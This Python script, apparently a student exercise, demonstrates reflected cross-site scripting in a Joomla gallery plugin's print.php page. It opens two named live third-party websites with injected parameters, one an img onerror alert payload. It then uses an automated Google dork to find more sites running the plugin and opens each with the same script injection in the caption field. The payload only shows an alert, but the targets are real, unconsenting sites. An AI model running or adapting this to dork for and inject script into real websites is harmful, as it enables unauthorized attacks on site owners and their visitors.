# Import the webbrowser module
import webbrowser

# Import re module to use string manipulation
import re

# Import the search module from the googlesearch library
from googlesearch import search 

# You can also change it with method:
# webbrowser.get(browser).open()
# where the variable browser is a string with the name of the browser i.e. chrome, firefox, safari...
browser = "firefox"


########################
# XSS in the name field
########################

print("########################################################\n" + "Opening the browser with a new tab for a website with the vulnerability on the name caption\n")

url1 = "http://www.colorator.net/plugins/content/sige/plugin_sige/print.php?img=http://www.colorator.net/images/Transport/off_road_cars/1/10.gif"
webbrowser.open(url1 + "&name=Hi, it seems there is missing some input filtering... I'm changing the name of this picture from the url!")
print("This is the first vulnerable website link: " +url1 + "\n")

url2 = "https://moi-raskraski.ru/plugins/content/sige/plugin_sige/print.php?img=http://moi-raskraski.ru%2Fimages%2Fraskraski%2Fderevo%2Fpalma%2Fraskraska-derevo-palma-1.jpg"
webbrowser.open_new_tab(url2 + "&name=\"<img%20src=x%20onerror=alert(%27Hackerino_from_UNIBZ_students%27)>\"")
print("This is the second vulnerable website link: " +url1 + "\n")
  

##############################################################
# GOOGLE DORKING to search a joomla website using sige plugin 
##############################################################

print("########################################################\n" + "Automated google dorking and js injection in url\n")

query = "allinurl:/plugins/content/sige/plugin_sige/print.php?"

# look for the first 5 results and try to substitute the vulnarable url pattern with an alert tag
for j in search(query, tld="co.in", num=5, stop=5, pause=2): 
	
	# Split the url after print.php? of the found website
	x = re.split("print.php?", j)

	print("URL for the found website: " + j + "\n")

	
	# Append the attack
	webbrowser.open_new_tab(x[0]+"print.php?img=x&caption=<img%20src=x%20onerror=alert(%27Hackerino_from_UNIBZ_students%27)>")
	
	print("Modified url with the js script payload" + x[0]+"print.php?img=x&caption=<img%20src=x%20onerror=alert(%27Hackerino_from_UNIBZ_students%27)>" + "\n")
